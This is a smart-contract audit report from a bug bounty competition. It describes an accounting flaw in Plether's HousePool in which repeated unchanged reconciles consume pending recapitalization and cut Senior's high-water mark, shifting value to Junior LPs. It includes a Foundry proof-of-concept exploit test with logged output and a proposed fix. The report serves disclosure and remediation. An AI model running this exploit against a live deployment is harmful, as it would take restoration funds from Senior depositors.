# \#99838 [SC-High] A reconcile with nothing changed re-applies a partly used recapitalization and cuts Senior's high-water mark

**Submitted on Nov 15th 2026 at 12:41:23 UTC by @Audittens for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99838
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Theft of unclaimed yield

## Description

## Brief/Intro

When a loss wipes both tranches, the engine owner can recapitalize the pool. A reconcile applies as much of the recapitalization as the pool's value allows and keeps the rest pending. The next reconcile checks that pending rest against the same value again, although the first one already gave it to Senior. With price, cash and trader claims unchanged, the second reconcile books Senior's principal as a loss, re-applies it as a fresh recapitalization, and resets Senior's high-water mark to the smaller pending amount. Each LP epoch settlement repeats this until the pending amount is gone. When the price recovers, Senior is restored only to the lowered mark and Junior receives the rest.

## Vulnerability Details

Every reconcile caps the pending recapitalization by the [whole distributable value](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L1829-L1834): cash plus the price delta, minus trader claims. The plan then [reserves](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolReconcilePlanLib.sol#L68-L71) the capped amount, taking it out of distributable before comparing what is left with the tranches' principal. The specification gives the reason for that step: [reserving pending inflows](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/ACCOUNTING_SPEC.md#L339-L340) prevents counting the same inflow twice.

The cap does not tell new cash from value an earlier reconcile already assigned. After a partial application, distributable is exactly the Senior principal the first reconcile created, and the rest of the bucket has no cash behind it. The second reconcile still reserves up to that whole value, finds nothing left for Senior, and [books a loss](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolReconcilePlanLib.sol#L102-L104) equal to Senior's principal. With both principals at zero, the pending recapitalization takes the bootstrap branch:

[packages/perps/src/libraries/HousePoolPendingPreviewLib.sol:117-122](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolPendingPreviewLib.sol#L117-L122)
```solidity
if (state.seniorSupply > 0) {
    if (state.waterfall.seniorPrincipal == 0 && state.waterfall.juniorPrincipal == 0) {
        state.waterfall.seniorPrincipal += remaining;
        state.waterfall.seniorHighWaterMark =
            recapitalizationTargetAssets > remaining ? recapitalizationTargetAssets : remaining;
        remaining = 0;
```

Senior principal comes back to the same amount, but the mark is set from the pending amount, which the first reconcile already reduced. The bucket is then [decreased](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L1772) by the amount applied. No cash arrived, yet the bucket shrinks and the mark falls, and nothing raises either again.

The consumed part of the bucket does not disappear. Its value arrives later as ordinary surplus, which goes to Senior only up to the mark and then to Junior, although the same library states that recapitalization [never accrues](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolPendingPreviewLib.sol#L105-L107) to Junior principal.

This also shows that the fix of SC-L1 is incomplete. The response to SC-L1, on page 32 of the [pre-audit report](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/audits/plether-pre-audit-report.pdf), says that whatever cannot be settled yet "stays pending, stays reserved everywhere, and gets applied later once it's backed". Here the rest is applied by the next reconcile with nothing backing it.

### Scenario

The setup uses the release risk parameters from `DEPLOYMENT.md`. Carol deposits about 100,000 USDG in Senior, and Alice and Bob about 50,000 USDG in Junior.

1. A trader opens a 140,000 USDG short on 70,000 USDG of margin, and another a 100,000 USDG long. The long closes at a price of 0.6 for about 40,000 USDG of profit.
2. The basket reaches the 2.0 cap. The short's profit now exceeds the pool's cash, a deficit of 29,706 USDG.
3. The owner recapitalizes the pool with 49,511 USDG and clears degraded mode, the documented recovery. 19,804 USDG is distributable.
4. Alice requests to redeem all her Junior shares, and anyone settles the epoch. The reconcile wipes both tranches and applies 19,804 USDG, so Senior principal is 19,804 and the mark is 49,511 USDG. 29,706 USDG stays pending. Alice's request is worth nothing and is refunded, which counts as the settlement's progress.
5. One epoch later nothing has changed. Bob does the same as Alice and anyone settles. Senior principal is still 19,804, but the mark falls to 29,706 USDG and the pending amount to 9,902 USDG.
6. Two more epochs drain the pending amount to 0.
7. The basket returns to 1.0. Senior is worth 29,706 USDG and Junior 130,097 USDG.

In the control, with only the reconcile in step 4 before the recovery, Senior is worth 49,511 USDG, Junior 80,586 USDG, and the 29,706 USDG of recapitalization is still pending.

Step 4 itself sets the mark to the recapitalization amount, down from the 100,000 USDG it held before the loss. That first reset happens in the control too and is not counted here: this report is about what the later reconciles, with nothing changed, take on top of it.

The mark is not needed for the loss of the pending amount. With a recapitalization of three times the deficit, 89,119 USDG, the mark stays at 89,119 USDG, but the second reconcile still consumes the 29,706 USDG that was pending, and Junior ends with 110,293 USDG instead of 80,586 USDG.

## Impact Details

Theft of unclaimed yield. Senior LPs lose restoration that a recapitalization was meant to give them, and Junior LPs receive it when the price recovers. In the test Senior ends 19,804 USDG lower and Junior 49,511 USDG higher than with a single reconcile.

Senior LPs lose the restoration the owner paid for: 19,804 USDG, 40% of their mark, in the test. Junior LPs receive it, along with recapitalization that would otherwise stay pending for Senior restoration or the unassigned balance. Junior holders can force the reconciles, for gas and the Pyth fee.

Conditions:
- A loss must wipe both tranches. In the test the basket moves to its 2.0 cap after a long closes in profit. The owner's recapitalization path exists for this case.
- The owner must recapitalize with more than the deficit `X` but no more than `2X`, and clear degraded mode. Below `X` nothing is applied. Above `2X` the second reconcile still drains the pending amount to Junior, but the mark stays.
- Each extra reconcile needs a matured LP request, so at most one runs per hourly epoch. Any Junior holder can create one by requesting to redeem their whole balance. Ordinary LP requests settled while the price stays down have the same effect, with no attacker.

## Recommended Mitigation

Once a reconcile applies only part of a recapitalization, the rest has no cash behind it. Track that rest, and in later reconciles cap it by the value no one holds yet, `distributable - (seniorPrincipal + juniorPrincipal + unassignedAssets)`, not by the whole distributable value. Keep the current cap for a recapitalization's first reconcile, where its cash is in the pool.

With this cap, the second reconcile in the test reserves nothing and changes nothing. At the recovery the rest is reserved from the new value, revenue restores Senior to its 49,511 USDG mark, and the pending 29,706 USDG follows its normal path, as in the control.

## References

- [HousePool.sol:1829-1834](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L1829-L1834)
- [HousePoolReconcilePlanLib.sol:68-71](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolReconcilePlanLib.sol#L68-L71)
- [HousePoolPendingPreviewLib.sol:117-122](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolPendingPreviewLib.sol#L117-L122)

## Proof of Concept

The tests use the release risk parameters from `DEPLOYMENT.md`, with price impact and carry on. Orders go through `OrderRouter.commitOrder` and `OrderRouter.executeOrder`, the owner's recovery through `CfdEngine.recapitalizePool` and `CfdEngine.clearDegradedMode`, and every settlement through the permissionless `OrderRouter.settleLpEpoch`. After step 4 the first test saves the state and plays out the control, where nothing else happens before the basket returns to 1.0, then reverts and plays out steps 5 to 7. The second test repeats the loss with a recapitalization of three times the deficit and one extra reconcile: the mark does not move, and the pending 29,706 USDG ends up with Junior.

Paste the code into `test/POC.t.sol` at the repository root and run:

```bash
forge test --match-path test/POC.t.sol -vv
```

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../packages/perps/test/perps/BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {HousePoolEngineViewTypes} from "@plether/perps/interfaces/HousePoolEngineViewTypes.sol";
import {console} from "forge-std/console.sol";

contract Test is BasePerpTest {

    address internal alice = makeAddr("alice"); // Junior LP
    address internal bob = makeAddr("bob"); // Junior LP
    address internal carol = makeAddr("carol"); // Senior LP
    address internal shortTrader = makeAddr("shortTrader");
    address internal longTrader = makeAddr("longTrader");
    address internal anyone = makeAddr("anyone");

    /// @dev Release risk parameters from DEPLOYMENT.md.
    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function test_unchangedReconcilesLowerSeniorMark() public {
        (uint256 deficit, uint256 recap) = _lossAndRecapitalization(5, 3);

        // Step 4: Alice requests to redeem all her Junior shares and anyone settles the epoch.
        _reconcileOneEpochAtCap(alice);
        uint256 markAfterStep4 = pool.seniorHighWaterMark();
        uint256 pendingAfterStep4 = pool.pendingRecapitalizationAssets();

        // For comparison: nothing else happens before the basket returns to 1.0.
        uint256 snapshot = vm.snapshotState();
        _advance(3 hours);
        _recover();
        uint256 seniorValueControl = seniorVault.totalAssets();
        vm.revertToState(snapshot);

        // Step 5: one epoch later nothing has changed. Bob does the same as Alice and anyone settles.
        _reconcileOneEpochAtCap(bob);
        uint256 markAfterStep5 = pool.seniorHighWaterMark();
        uint256 pendingAfterStep5 = pool.pendingRecapitalizationAssets();

        // Step 6: two more epochs drain the pending recapitalization to 0.
        _reconcileOneEpochAtCap(alice);
        _reconcileOneEpochAtCap(bob);

        // Step 7: the basket returns to 1.0.
        _recover();

        console.log("deficit at the cap (USDG):                    ", deficit / 1e6);
        console.log("recapitalization (USDG):                      ", recap / 1e6);
        console.log("Senior principal (USDG):                      ", pool.seniorPrincipal() / 1e6);
        console.log("Senior mark after step 4 (USDG):              ", markAfterStep4 / 1e6);
        console.log("pending recap after step 4 (USDG):            ", pendingAfterStep4 / 1e6);
        console.log("Senior mark after step 5 (USDG):              ", markAfterStep5 / 1e6);
        console.log("pending recap after step 5 (USDG):            ", pendingAfterStep5 / 1e6);
        console.log("pending recap after step 6 (USDG):            ", pool.pendingRecapitalizationAssets() / 1e6);
        console.log("Senior value after step 7 (USDG):             ", seniorVault.totalAssets() / 1e6);
        console.log("Junior value after step 7 (USDG):             ", juniorVault.totalAssets() / 1e6);
        console.log("Senior value, only step 4's reconcile (USDG): ", seniorValueControl / 1e6);

        assertLt(seniorVault.totalAssets(), seniorValueControl, "Senior lost part of its restoration");
    }

    /// @dev The same loss with a recapitalization of three times the deficit. The mark does not move, but the rest
    ///      of the recapitalization, which has no cash behind it, is still consumed and ends up with Junior.
    function test_unchangedReconcilePaysPendingRecapToJunior() public {
        (, uint256 recap) = _lossAndRecapitalization(3, 1);
        _reconcileOneEpochAtCap(alice);
        uint256 markAfterFirst = pool.seniorHighWaterMark();
        uint256 pendingAfterFirst = pool.pendingRecapitalizationAssets();

        // For comparison: nothing else happens before the basket returns to 1.0.
        uint256 snapshot = vm.snapshotState();
        _advance(3 hours);
        _recover();
        uint256 juniorValueControl = juniorVault.totalAssets();
        vm.revertToState(snapshot);

        // One epoch later nothing has changed, and anyone settles again. Then the basket returns to 1.0.
        _reconcileOneEpochAtCap(bob);
        uint256 pendingAfterSecond = pool.pendingRecapitalizationAssets();
        _recover();

        console.log("recapitalization (USDG):                       ", recap / 1e6);
        console.log("Senior mark after the first reconcile (USDG):  ", markAfterFirst / 1e6);
        console.log("pending recap after the first reconcile (USDG):", pendingAfterFirst / 1e6);
        console.log("Senior mark after the second reconcile (USDG): ", pool.seniorHighWaterMark() / 1e6);
        console.log("pending recap after the second reconcile (USDG):", pendingAfterSecond / 1e6);
        console.log("Junior value after the recovery (USDG):        ", juniorVault.totalAssets() / 1e6);
        console.log("Junior value, only the first reconcile (USDG): ", juniorValueControl / 1e6);

        assertEq(pool.seniorHighWaterMark(), markAfterFirst, "the mark does not move");
        assertGt(juniorVault.totalAssets(), juniorValueControl, "Junior received the pending recapitalization");
    }

    /// @dev Steps 1 to 3: the loss at the cap and the owner's recapitalization of `numerator / denominator` times
    ///      the deficit.
    function _lossAndRecapitalization(
        uint256 numerator,
        uint256 denominator
    ) internal returns (uint256 deficit, uint256 recap) {
        // Setup: Alice and Bob deposit into Junior, then Carol into Senior.
        _fundJunior(alice, 24_500e6);
        _fundJunior(bob, 24_500e6);
        _fundSenior(carol, 99_000e6);

        // Step 1: a trader opens a 140,000 USDG short on 70,000 USDG of margin and another a 100,000 USDG long,
        // in steps under the skew cap. The long closes at 0.6 for about 40,000 USDG of profit.
        _fundTrader(shortTrader, 100_000e6);
        _fundTrader(longTrader, 20_000e6);
        _trade(shortTrader, CfdTypes.Side.SHORT, false, 50_000e18, 30_000e6, 1e8);
        _trade(longTrader, CfdTypes.Side.LONG, false, 50_000e18, 2500e6, 1e8);
        _trade(shortTrader, CfdTypes.Side.SHORT, false, 50_000e18, 20_000e6, 1e8);
        _trade(longTrader, CfdTypes.Side.LONG, false, 50_000e18, 2500e6, 1e8);
        _trade(shortTrader, CfdTypes.Side.SHORT, false, 40_000e18, 20_000e6, 1e8);
        _trade(longTrader, CfdTypes.Side.LONG, true, 100_000e18, 0, 0.6e8);

        // Step 2: the basket reaches the 2.0 cap. The short's profit exceeds the pool's cash.
        _advance(1);
        router.updateMarkPrice(_mockPythUpdateData(2e8));
        deficit = uint256(-_netLpEquity());

        // Step 3: the owner recapitalizes the pool with a multiple of the deficit (5/3 in the scenario) and clears
        // degraded mode.
        recap = deficit * numerator / denominator;
        settlementToken.mint(address(this), recap);
        settlementToken.approve(address(engine), recap);
        engine.recapitalizePool(recap);
        engine.clearDegradedMode();
        _advance(1 hours + 1);
    }

    /// @dev A Junior holder requests to redeem all its shares, which are worth nothing, so the request is refunded
    ///      and counts as the settlement's progress. Anyone settles the epoch at the capped price; the holder takes
    ///      its shares back.
    function _reconcileOneEpochAtCap(
        address juniorHolder
    ) internal {
        uint256 shares = juniorVault.balanceOf(juniorHolder);
        vm.prank(juniorHolder);
        uint256 requestId = juniorVault.requestRedeem(shares, juniorHolder, juniorHolder);
        vm.warp(pool.lpEpochStart(requestId) + 5);
        vm.roll(block.number + 1);
        vm.prank(anyone);
        router.settleLpEpoch(_mockPythUpdateData(2e8));
        vm.prank(juniorHolder);
        juniorVault.claimRedeemRefund(requestId, juniorHolder, juniorHolder);
    }

    /// @dev The basket returns to the short's entry price and anyone refreshes the mark.
    function _recover() internal {
        _advance(10);
        vm.prank(anyone);
        router.updateMarkPrice(_mockPythUpdateData(1e8));
    }

    function _netLpEquity() internal view returns (int256) {
        HousePoolEngineViewTypes.HousePoolInputSnapshot memory snap =
            engineProtocolLens.getHousePoolInputSnapshot(pool.markStalenessLimit());
        return int256(snap.physicalAssets) + snap.terminalLpPriceDeltaAssets - int256(snap.traderClaimBalanceAssets);
    }

    function _advance(
        uint256 seconds_
    ) internal {
        vm.warp(vm.getBlockTimestamp() + seconds_);
        vm.roll(block.number + 1);
    }

    /// @dev The trader commits through `OrderRouter.commitOrder` and it is executed a second later at `price`.
    function _trade(
        address trader,
        CfdTypes.Side side,
        bool isClose,
        uint256 size,
        uint256 margin,
        uint256 price
    ) internal {
        _advance(1);
        router.updateMarkPrice(_mockPythUpdateData(price));
        uint256 window = router.maxExecutionWindowSeconds();
        OrderV3Types.OrderRequest memory request = OrderV3Types.OrderRequest({
            clientOrderId: keccak256(abi.encode(router.nextCommitId())),
            side: side,
            sizeDelta: size,
            marginDelta: margin,
            targetPrice: (side == CfdTypes.Side.LONG) == isClose ? type(uint256).max : 1,
            isClose: isClose,
            bounds: OrderV3Types.ExecutionBounds({
                submitBy: uint64(vm.getBlockTimestamp() + window),
                executionWindowSeconds: uint32(window),
                allowedExecutionModes: 7,
                expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
                maxExecutionBountyAssets: type(uint256).max,
                maxExecutionNotionalAssets: type(uint256).max,
                maxGrossAccountDebitAssets: type(uint256).max,
                maxActionChargeAssets: type(uint256).max,
                maxExplicitFeesAssets: type(uint256).max,
                maxPostPositionSize: type(uint256).max,
                minPostSettlementBalanceAssets: 0,
                minPostPositionEquityAssets: 0,
                maxPostLeverageBps: type(uint32).max
            })
        });
        vm.prank(trader);
        uint64 orderId = router.commitOrder(request);
        _advance(1);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(orderId, _mockPythUpdateData(price));
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed), "order executes");
    }

}
```

Output:

```
Ran 2 tests for test/POC.t.sol:Test
[PASS] test_unchangedReconcilePaysPendingRecapToJunior() (gas: 16811796)
Logs:
  recapitalization (USDG):                        89119
  Senior mark after the first reconcile (USDG):   89119
  pending recap after the first reconcile (USDG): 29706
  Senior mark after the second reconcile (USDG):  89119
  pending recap after the second reconcile (USDG): 0
  Junior value after the recovery (USDG):         110293
  Junior value, only the first reconcile (USDG):  80586
[PASS] test_unchangedReconcilesLowerSeniorMark() (gas: 18073900)
Logs:
  deficit at the cap (USDG):                     29706
  recapitalization (USDG):                       49511
  Senior principal (USDG):                       19804
  Senior mark after step 4 (USDG):               49511
  pending recap after step 4 (USDG):             29706
  Senior mark after step 5 (USDG):               29706
  pending recap after step 5 (USDG):             9902
  pending recap after step 6 (USDG):             0
  Senior value after step 7 (USDG):              29706
  Junior value after step 7 (USDG):              130097
  Senior value, only step 4's reconcile (USDG):  49511

Suite result: ok. 2 passed; 0 failed; 0 skipped
```
